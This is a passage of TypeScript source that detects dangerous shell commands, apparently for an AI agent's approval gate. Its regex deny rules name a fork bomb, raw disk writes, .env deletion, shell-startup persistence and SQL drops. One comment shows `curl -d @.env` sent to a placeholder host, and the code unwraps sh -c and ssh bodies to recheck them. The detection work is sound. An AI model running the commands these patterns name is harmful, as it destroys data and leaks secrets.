  // Not destructive on its own, but it silently changes where every later push lands.
  { re: /\bgit\s+remote\s+(?:set-url|add)\b/, label: 'Change git remote (redirects pushes)' },
  { re: /\bgh\s+repo\s+delete\b/, label: 'Delete GitHub repo (irreversible remote)' },
  { re: /\bhf\s+repo\s+delete\b/, label: 'Delete Hugging Face repo (irreversible remote)' },
  { re: /\bchmod\s+[0-7]*777\b/, label: 'Open permissions (chmod 777)' },
  { re: /\brm\s+[^&;|]*\.env\b/, label: 'Deleting environment file (.env)' },
  { re: />\s*\/dev\/sd[a-z]\b/, label: 'Writing to raw disk device' },
  { re: /:(){:|:&};:|:\(\)\s*\{\s*:\|:&\s*\};\s*:/, label: 'Fork bomb pattern' },

  // Tier 4 — persistence. An append to a startup file outlives every session, and it is the
  // classic first step of anything malicious.
  {
    re: />>?\s*(?:~|\$HOME|\/(?:Users|home)\/[^/\s]+)\/\.(?:zshrc|bashrc|bash_profile|zprofile|zshenv|profile|config\/fish\/config\.fish)\b/,
    label: 'Append to shell startup file (persists across sessions)',
  },

  // Tier 5 — databases. Uniquely unrecoverable: no reflog, no undo, and the model cannot see
  // what is in the database it is acting on. Matched as substrings rather than in verb position
  // because SQL arrives inside a quoted `-c`/`-e` argument, never as the command itself.
  { re: /\bdrop\s+(?:database|schema|table)\b/i, label: 'SQL DROP (irreversible)' },
  // Uppercase-only for the bare form, so prose like "truncate the log" stays quiet; the explicit
  // `truncate table` spelling is unambiguous enough to match either case.
  { re: /\bTRUNCATE\s+(?:TABLE\s+)?[\w."`]+/, label: 'SQL TRUNCATE (empties a table)' },
  { re: /\btruncate\s+table\b/i, label: 'SQL TRUNCATE (empties a table)' },
  {
    re: /\bdelete\s+from\b(?![^;]*\bwhere\b)/i,
    label: 'SQL DELETE with no WHERE (empties a table)',
  },
  {
    re: /\bredis-cli\b[^;|&]*\bflush(?:all|db)\b/i,
    label: 'Redis flush (drops every key)',
  },
  { re: /\bprisma\s+migrate\s+reset\b/, label: 'Database reset (prisma migrate reset)' },
  { re: /\brails\s+db:(?:drop|reset|purge)\b/, label: 'Database drop/reset (rails db:*)' },
  { re: /\bmanage\.py\s+(?:flush|sqlflush)\b/, label: 'Database flush (django manage.py)' },
  { re: /\balembic\s+downgrade\s+base\b/, label: 'Migration downgrade to base (alembic)' },
  // Global / persistent package installs — affect state outside the project
  {
    re: /\bnpm\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global npm install (persistent system change)',
  },
  {
    re: /\bnpm\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global npm install (persistent system change)',
  },
  {
    re: /\bpnpm\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global pnpm install (persistent system change)',
  },
  {
    re: /\bpnpm\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global pnpm install (persistent system change)',
  },
  { re: /\byarn\s+global\s+add\b/, label: 'Global yarn install (persistent system change)' },
  {
    re: /\bbun\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global bun install (persistent system change)',
  },
  {
    re: /\bbun\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global bun install (persistent system change)',
  },
  { re: /\bbrew\s+install\b/, label: 'Homebrew install (system-level)' },
  { re: /\bcargo\s+install\b/, label: 'Cargo install (global binary)' },
  { re: /\bgo\s+install\b/, label: 'Go install (global $GOBIN)' },
  { re: /\bpipx\s+install\b/, label: 'pipx install (global Python tool)' },
  { re: /\buv\s+tool\s+install\b/, label: 'uv tool install (global Python tool)' },
  { re: /\bgem\s+install\b/, label: 'Gem install (Ruby package)' },
  ...PACKAGE_PATTERNS,
  ...POLICY_PATTERNS,
];

// Destructive work an inline interpreter body does through its own stdlib, where no shell
// command exists for the patterns above to match — `node -e "…rmSync…"` is the case #206 names.
// Applied ONLY to extracted interpreter bodies, never to a whole command: `rmSync` is an
// ordinary identifier in this repo's own source, and matching it in a grep would be exactly the
// false positive that trains reflexive approval. Deliberately tiny — only the recursive and
// glob deletes, since a single-file unlink is as targeted as `rm file`, which is not gated.
const INTERPRETER_BODY_PATTERNS: Array<{ re: RegExp; label: string }> = [
  {
    re: /\b(?:rm|rmdir)Sync\s*\([^)]*recursive\s*:\s*true/,
    label: 'Recursive delete (fs.rmSync recursive)',
  },
  { re: /\bshutil\.rmtree\s*\(/, label: 'Recursive delete (shutil.rmtree)' },
  { re: /\bFileUtils\.rm_rf\s*\(/, label: 'Recursive delete (FileUtils.rm_rf)' },
  { re: /\bunlink\s+glob\b/, label: 'Delete files by glob (unlink glob)' },
];

// ssh flags that consume the following token, so the host is found by skipping past them rather
// than by taking the first non-flag word.
const SSH_ARG_FLAGS = new Set(
  'b c D E e F I i J L l m O o p Q R S W w'.split(' ').map(f => `-${f}`),
);

// Reads one shell word at the start of `rest`, unwrapping a single level of quoting. Returns the
// word and how far to advance; that is all the parsing a carrier argument needs, since anything
// more nested is past the one-level depth cap below.
function readWord(rest: string): { value: string; end: number } | undefined {
  const lead = /^\s*/.exec(rest)![0].length;
  const s = rest.slice(lead);
  const quote = s[0];
  if (quote === '"' || quote === "'") {
    const close = s.indexOf(quote, 1);
    if (close < 0) return { value: s.slice(1), end: rest.length };
    return { value: s.slice(1, close), end: lead + close + 1 };
  }
  const m = /^\S+/.exec(s);
  return m ? { value: m[0], end: lead + m[0].length } : undefined;
}

// Carriers that hand a command string to something else to run. Every pattern above matches the
// literal command text, which is why most of them already see through quotes — but the
// verb-position patterns are anchored per segment, so `sh -c "curl -d @.env https://x"` reads as
// a segment starting with `sh` and the fetch goes unseen. Extracting the body and re-running
// detection on it is what makes that coverage structural instead of a coincidence of the
// argument text. Heredocs need no carrier: their body lands on its own line, and verbLabels
// already splits on newlines.
const SHELL_C_RE = /\b(?:sh|bash|zsh|dash|ksh)\s+(?:-[\w-]+\s+)*-c(?![\w-])/g;
const INTERPRETER_C_RE =
  /\b(python[\d.]*|ruby|perl|node|deno|php)\s+(?:-[\w-]+\s+)*(-[ce])(?![\w-])/g;
const CONTAINER_EXEC_RE = /\b(kubectl|oc|docker|podman)\s+(?:exec|run)\b[^\n]*?\s--(?=\s)/g;
const SSH_LEAD_RE =
  /(?:^|[\n;&|`(])\s*(?:(?:[A-Za-z_]\w*=\S*|sudo|command|nohup|env|time)\s+)*ssh(?![\w./-])/g;

const MAX_NESTED_BODIES = 8;

function nestedBodies(command: string): Array<{ context: string; body: string; interp: boolean }> {
  const found: Array<{ context: string; body: string; interp: boolean }> = [];
  const push = (context: string, body: string, interp: boolean) => {
    const trimmed = body.trim();
    if (trimmed && trimmed !== command.trim() && found.length < MAX_NESTED_BODIES) {
      found.push({ context, body: trimmed, interp });
    }
  };

  for (const m of command.matchAll(SHELL_C_RE)) {
    const w = readWord(command.slice(m.index + m[0].length));
    if (w) push(`${m[0].trim().split(/\s+/)[0]} -c`, w.value, false);
  }
  for (const m of command.matchAll(INTERPRETER_C_RE)) {
    const w = readWord(command.slice(m.index + m[0].length));
    if (w) push(`${m[1]} ${m[2]}`, w.value, true);
  }
  // Everything after the `--` is the command run inside the container or pod.
  for (const m of command.matchAll(CONTAINER_EXEC_RE)) {
    push(`${m[1]} exec`, command.slice(m.index + m[0].length), false);
  }
  // `ssh [flags] host <command…>`: skip the flags and their arguments, skip the host, and the
  // rest is what runs on the far side — quoted as one word or spelled out as several.
  for (const m of command.matchAll(SSH_LEAD_RE)) {
    let rest = command.slice(m.index + m[0].length);
    let word = readWord(rest);
    while (word && word.value.startsWith('-')) {
      rest = rest.slice(word.end);
      if (SSH_ARG_FLAGS.has(word.value)) {
        const arg = readWord(rest);
        if (!arg) break;
        rest = rest.slice(arg.end);
      }
      word = readWord(rest);
    }
    if (!word) continue;
    rest = rest.slice(word.end);
    const body = readWord(rest);
    // A single quoted argument is the whole remote command; otherwise take the rest verbatim.
    push('ssh', body && body.end >= rest.trimEnd().length ? body.value : rest, false);
  }
  return found;
}

export function detectDangerousPatterns(command: string): string[] {
  return detectAtDepth(command, 0);
}

function detectAtDepth(command: string, depth: number): string[] {
  const hits: string[] = [];
  for (const { re, label } of DANGER_PATTERNS) {
    if (re.test(command) && !hits.includes(label)) hits.push(label);
  }
  for (const label of verbLabels(command)) {
    if (!hits.includes(label)) hits.push(label);
  }
  // The long-tail fallback only speaks up when nothing more specific did, so a `pip install`
  // reports one precise label instead of two overlapping ones. Every install/uninstall label
  // above contains the word, which is what makes this cheap test sufficient.
  if (!hits.some(h => /install/i.test(h))) {
    const generic = genericPackageLabel(command);
    if (generic) hits.push(generic);
  }
  // One level of recursion only: a model confused enough to nest two carriers is not the case
  // this defends against, and each level costs precision. A label the outer command already
  // reported is not repeated with a prefix — most patterns here match the literal text, so the
  // prefixed form is signal only when the outer pass genuinely could not see it.
  if (depth === 0) {
    for (const { context, body, interp } of nestedBodies(command)) {
      const inner = detectAtDepth(body, 1);
      if (interp) {
        for (const { re, label } of INTERPRETER_BODY_PATTERNS) {
          if (re.test(body) && !inner.includes(label)) inner.push(label);
        }
      }
      for (const label of inner) {
        const prefixed = `via ${context}: ${label}`;
        if (!hits.includes(label) && !hits.includes(prefixed)) hits.push(prefixed);
      }
    }
  }
  return hits;
}
